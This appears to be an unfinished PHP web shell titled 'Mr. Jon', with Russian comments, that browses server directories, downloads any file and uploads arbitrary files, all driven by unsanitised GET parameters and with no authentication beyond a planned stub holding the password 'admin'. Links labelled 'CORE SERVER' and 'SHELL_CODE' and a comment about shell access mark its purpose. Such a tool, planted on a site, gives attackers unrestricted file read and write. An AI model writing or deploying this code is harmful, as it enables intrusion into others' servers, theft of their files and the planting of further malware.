<?php
ini_set('display_errors',1);
error_reporting(E_ALL ^E_NOTICE);
?>
<html>
    <head>
        <title>Mr. Jon</title>
        <script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
    </head>
    <body> 
        <?=file_download();?>
        <style>
        body{
            width:100%;
            overflow-x: hidden;
            display:block;
            background-color: 078704;
            font-family:Lucida Sans Unicode, Lucida Grande, sans-serif;
            font-size:14px;
        }
        .container {
        padding-right: 15px;
        padding-left: 15px;
        margin-right: auto;
        margin-left: auto;
      }
      @media (min-width: 768px) {
        .container {
          width: 750px;
        }
      }
      @media (min-width: 992px) {
        .container {
          width: 970px;
        }
      }
      @media (min-width: 1200px) {
        .container {
          width: 1170px;
        }
      }
      .container-fluid {
        padding-right: 15px;
        padding-left: 15px;
        margin-right: auto;
        margin-left: auto;
      }
      .row {
        margin-right: -15px;
        margin-left: -15px;
      }
        .main{
            width: 100%;
            height: 30px;
            border: 1px solid black;
            padding: 10px;
            text-align: center;
            background-color: #0397AF;
        }
        .col-md-1, .col-md-2, .col-md-3, .col-md-4, 
        .col-md-5, .col-md-6, .col-md-7, .col-md-8, 
        .col-md-9, .col-md-10, .col-md-11, .col-md-12{
        position: relative;
        min-height: 1px;
        padding-right: 15px;
        padding-left: 15px;
        float: left;
      }
      
      @media (min-width: 992px) {
  
    .col-md-12 {
      width: 100%;
    }
    .col-md-11 {
      width: 91.66666667%;
    }
    .col-md-10 {
      width: 83.33333333%;
    }
    .col-md-9 {
      width: 75%;
    }
    .col-md-8 {
      width: 66.66666667%;
    }
    .col-md-7 {
      width: 58.33333333%;
    }
    .col-md-6 {
      width: 50%;
    }
    .col-md-5 {
      width: 41.66666667%;
    }
    .col-md-4 {
      width: 33.33333333%;
    }
    .col-md-3 {
      width: 25%;
    }
    .col-md-2 {
      width: 16.66666667%;
    }
    .col-md-1 {
      width: 8.33333333%;
    }
   
  }
    .direct {
    height: auto;
    position: relative;
    background-color: #B3B6B7;
    top: 60px;
    }
    
    .main_button{
            background-color: #4B68DD;
            color: white;
            border: 2px solid #DB0CEC;
    }
    .tableFile {
    display: block;
    background-color: #B3B6B7;
    height: auto;
    position: relative;
    }
    li {
    list-style-type: none; /* Убираем точки */
   }
   .uploadFile {
    padding: 20px;
    display: block;
    background-color: #B3B6B7;
    height: auto;
    position: relative;
    }
    .mainIndex {
    margin-right: 25px;
    }
        
    </style>
    
        <div class="container-fluid">
            <div class="col-md-12">
                <div class="row">
                    <div class="col-md-2">
                        <div class="direct">
                         <div class="tableDir">
                                    <form class='formDir'  name='table' method='POST'>
                                        <table>
                                            <thead>
                                            <th>Directory:</th>
                                             </thead>
                                            <tbody>
                                            <tr>
                                              <td>
                                                  <ul class="dirUrl"><?= showTreeDir();?></ul>
                                              </td>
                                              
                                            </tr>
                                            </tbody>

                                        </table>
                                         
                                    </form>
                                </div>
                        </div>
                    </div>
                    <div class="col-md-6">
                        <div class="mainIndex">
                            <div class="col-md-12">
                                <div class="main">
                                    <div class="col-md-4">
                                        <form action="" method=post enctype=multipart/form-data>
                                        <input type=file name=uploadfile>
                                        <input type=submit class="main_button" value=Upload>
                                        </form>
                                     
                                    </div>
                                    <div class="col-md-1">
                                        <button class="main_button">Delete</button>
                                    </div>
                                    <div class="col-md-1">
                                        <button class="main_button">zip</button>
                                    </div>
                                    <div class="col-md-1">
                                        <button class="main_button">unzip</button>
                                    </div>
                                </div>
                            </div>
                            <div class="col-md-12">
                              <div class="col-md-12">
                                <div class="tableFile">
                                    <form class='formFile'  name='table' method='POST'>
                                        <table>
                                            <thead>
                                            <th>File:</th>
                                             </thead>
                                            <tbody>
                                            <tr>
                                              <td>
                                                  <ul class="fileUrl"><?= showTreeFile();?></ul>
                                              </td>
                                              
                                            </tr>
                                            </tbody>

                                        </table>
                                         
                                    </form>
                                </div>
                              </div>    
                            </div>
                        </div>
                    </div>
                    <div class="col-md-2">
                        <div class="uploadFile">
                              <?=upload();?>
                        </div>
                    </div>
                 </div>    
            </div>
          </div>
 
        <footer>
            <script>
            $(document).ready(function(){
                
                $(".main_button_download").click(function(){
                    
                });
            });
            </script>
        </footer>   
    </body>
</html>
<?php
/* Получаем полный список каталогов в текущей директории */
function showTreeDir(){
     $folder = "./";
    #удаление, копирование, переменещение, zip, unzip при клике на кнопки вызывать модальные 
    #окна и указывать просто ссылки на текущее файлы, а если переместить просто указать ссылку 
    #каталога куда переместить. Удаление просто указать в модальном окне название файла
    #надо создать функцию (доступ к шеллу по логину и паролю)
    $space = "";
    if(!empty($_GET["dir"])){
        $folder = $_GET["dir"];
        
    }
    
    $files = scandir($folder);
 
     echo "<li>"."<a href='index.php?dir=/../'style='color:red;'>CORE SERVER</a>"."</li>";        
     echo "<li>"."<a href='index.php?dir=../'style='color:red;'>PATH</a>"."</li>";
     echo "<li>"."<a href='index.php?dir=./' style='color:red;'>SHELL_CODE</a>"."</li>";
    foreach($files as $file){
        if (($file == '.') || ($file == '..')) continue;
        $f0 = $folder.'/'.$file; //Получаем полный путь к файлу
         
         if (is_dir($f0)) {
        //выводим директории в текущей директории
         echo "<li>"."<a href='index.php?dir=".$f0."'>".$space.$file."</a>"."</li>";
        //условие выводит только файлы в текущей директории
        }
     
    }
 
}

#TODO надо будет создать функцию которая по клику будет скачивать файлы сервера по 
#ссылке, возможно вызывать модальное окно где надо будет указать имя файла а текущую 
#директорию брать GET  запросом и так скачивать

//функция которая выводит файлы в текущей директории
function showTreeFile(){
     $folder = "./";
 
    $space = "";
    
    //принимаем текущую директорию и выводим данные
    if(!empty($_GET["dir"])){
        $folder = $_GET["dir"];
        
    }
   
    
    $files = scandir($folder);
      
    foreach($files as $file){
        if (($file == '.') || ($file == '..')) continue;
        $f0 = $folder.'/'.$file; //Получаем полный путь к файлу
         
        //условие выводит только файлы в текущей директории
         if (is_file($f0)) {
         echo "<li>"."<a href='index.php?dir=".$folder."&file=".$file."'>".$space.$file."</a>"."</li>";
         
        } 
     
    }
}

#TODO требуется доработать ибо почему то перезаписывается код внутри файла (только шапка)

//функция по скачиванию файлов с сервера
function file_download() {
  
    if(!empty($_GET["file"])){
        $filename = $_GET["file"];
  
   // $filename = dirname(__FILE__).'/'.$file.'';
 // необходимых для IE, в противном случае Content-Disposition игнорируется
if(ini_get('zlib.output_compression'))
  ini_set('zlib.output_compression', 'Off');
 
$file_extension = strtolower(substr(strrchr($filename,"."),1));
 
if( $filename == "" )
{
  echo "Download FileОШИБКА: Не указан файл.";
  exit;
}/* elseif ( ! file_exists( $filename ) ) // сделать проверку на существование удаленного файла
{
  echo "Download FileОШИБКА: Файл не найден.";
  exit;
};*/
switch( $file_extension )
{
  case "pdf": $ctype="application/pdf"; break;
  case "exe": $ctype="application/octet-stream"; break;
  case "zip": $ctype="application/zip"; break;
  case "doc": $ctype="application/msword"; break;
  case "xls": $ctype="application/vnd.ms-excel"; break;
  case "ppt": $ctype="application/vnd.ms-powerpoint"; break;
  case "gif": $ctype="image/gif"; break;
  case "png": $ctype="image/png"; break;
  case "jpeg":
  case "jpg": $ctype="image/jpg"; break;
  default: $ctype="application/force-download";
}
header("Pragma: public"); // требуется
header('Content-Description: File Transfer');
header("Expires: 0");
header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
header("Cache-Control: private",false); // требуется для некоторых браузеров
header("Content-Type: $ctype");
header("Content-Disposition: attachment; filename=\"".basename($filename)."\";" );
header("Content-Transfer-Encoding: binary");
header("Content-Length: ".filesize($filename)); // необходимо доделать подсчет размера файла по абсолютному пути
readfile("$filename");
exit();
  }
}

//функция по загрузке файлов на сервер
function upload(){
    if(!empty($_GET["dir"])){
        $uploaddir = $_GET["dir"];
    }else{
        $uploaddir = "./";
    }
    
    if(!empty($uploaddir)){
        if(!empty($_FILES['uploadfile']['name'])){
           $uploadfile = $uploaddir.basename($_FILES['uploadfile']['name']); 
        }
        
    }
    
   if(!empty($uploadfile)){
      // Копируем файл из каталога для временного хранения файлов:
        if (copy($_FILES['uploadfile']['tmp_name'], $uploadfile))
        {
        echo "<h3>Файл успешно загружен на сервер</h3>";
        }
        else { echo "<h3>Ошибка! Не удалось загрузить файл на сервер!</h3>"; exit; }

        // Выводим информацию о загруженном файле:
        echo "<h3>Информация о загруженном на сервер файле: </h3>";
        echo "<p><b>Оригинальное имя загруженного файла: ".$_FILES['uploadfile']['name']."</b></p>";
        echo "<p><b>Mime-тип загруженного файла: ".$_FILES['uploadfile']['type']."</b></p>";
        echo "<p><b>Размер загруженного файла в байтах: ".$_FILES['uploadfile']['size']."</b></p>";
        echo "<p><b>Временное имя файла: ".$_FILES['uploadfile']['tmp_name']."</b></p>";
  }
        
}

#TODO надо будет придумать авторизация как на isyms, что бы по сессии было
//авторизация
function autorization(){
    $pass = "admin";
    
    
}

?>